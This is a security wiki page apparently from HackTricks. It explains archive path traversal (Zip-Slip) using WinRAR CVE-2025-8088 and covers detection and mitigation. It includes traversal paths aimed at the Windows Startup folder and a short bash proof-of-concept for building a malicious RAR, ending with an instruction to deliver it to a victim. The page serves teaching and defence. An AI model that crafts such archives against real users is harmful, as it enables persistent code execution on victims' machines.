# Archive Extraction Path Traversal ("Zip-Slip" / WinRAR CVE-2025-8088)

{{#include ../banners/hacktricks-training.md}}

## Overview

Many archive formats (ZIP, RAR, TAR, 7-ZIP, etc.) allow each entry to carry its own **internal path**. When an extraction utility blindly honours that path, a crafted filename containing `..` or an **absolute path** (e.g. `C:\Windows\System32\`) will be written outside of the user-chosen directory.  
This class of vulnerability is widely known as *Zip-Slip* or **archive extraction path traversal**.

Consequences range from overwriting arbitrary files to directly achieving **remote code execution (RCE)** by dropping a payload in an **auto-run** location such as the Windows *Startup* folder.

## Root Cause

1. Attacker creates an archive where one or more file headers contain:
   * Relative traversal sequences (`..\..\..\Users\\victim\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\payload.exe`)
   * Absolute paths (`C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\payload.exe`)
2. Victim extracts the archive with a vulnerable tool that trusts the embedded path instead of sanitising it or forcing extraction beneath the chosen directory.
3. The file is written in the attacker-controlled location and executed/loaded next time the system or user triggers that path.

## Real-World Example – WinRAR ≤ 7.12 (CVE-2025-8088)

WinRAR for Windows (including the `rar` / `unrar` CLI, the DLL and the portable source) failed to validate filenames during extraction.  
A malicious RAR archive containing an entry such as:

```text
..\..\..\Users\victim\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\payload.exe
```

would end up **outside** the selected output directory and inside the user’s *Startup* folder. After logon Windows automatically executes everything present there, providing *persistent* RCE.

### Crafting a PoC Archive (Linux/Mac)

```bash
# Requires rar >= 6.x
mkdir -p "evil/../../../Users/Public/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
cp payload.exe "evil/../../../Users/Public/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/"
rar a -ep evil.rar evil/*
```
Options used:
* `-ep`  – store file paths exactly as given (do **not** prune leading `./`).

Deliver `evil.rar` to the victim and instruct them to extract it with a vulnerable WinRAR build.

### Observed Exploitation in the Wild

ESET reported RomCom (Storm-0978/UNC2596) spear-phishing campaigns that attached RAR archives abusing CVE-2025-8088 to deploy customised backdoors and facilitate ransomware operations.

## Detection Tips

* **Static inspection** – List archive entries and flag any name containing `../`, `..\\`, *absolute paths* (`C:`) or non-canonical UTF-8/UTF-16 encodings.
* **Sandbox extraction** – Decompress into a disposable directory using a *safe* extractor (e.g., Python’s `patool`, 7-Zip ≥ latest, `bsdtar`) and verify resulting paths stay inside the directory.
* **Endpoint monitoring** – Alert on new executables written to `Startup`/`Run` locations shortly after an archive is opened by WinRAR/7-Zip/etc.

## Mitigation & Hardening

1. **Update the extractor** – WinRAR 7.13 implements proper path sanitisation. Users must manually download it because WinRAR lacks an auto-update mechanism.
2. Extract archives with the **“Ignore paths”** option (WinRAR: *Extract → "Do not extract paths"*) when possible.
3. Open untrusted archives **inside a sandbox** or VM.
4. Implement application whitelisting and restrict user write access to auto-run directories.

## Additional Affected / Historical Cases

* 2018 – Massive *Zip-Slip* advisory by Snyk affecting many Java/Go/JS libraries.
* 2023 – 7-Zip CVE-2023-4011 similar traversal during `-ao` merge.
* Any custom extraction logic that fails to call `PathCanonicalize` / `realpath` prior to write.

## References

- [BleepingComputer – WinRAR zero-day exploited to plant malware on archive extraction](https://www.bleepingcomputer.com/news/security/winrar-zero-day-flaw-exploited-by-romcom-hackers-in-phishing-attacks/)
- [WinRAR 7.13 Changelog](https://www.win-rar.com/singlenewsview.html?&L=0&tx_ttnews%5Btt_news%5D=283&cHash=a64b4a8f662d3639dec8d65f47bc93c5)
- [Snyk – Zip Slip vulnerability write-up](https://snyk.io/research/zip-slip-vulnerability)

{{#include ../banners/hacktricks-training.md}}
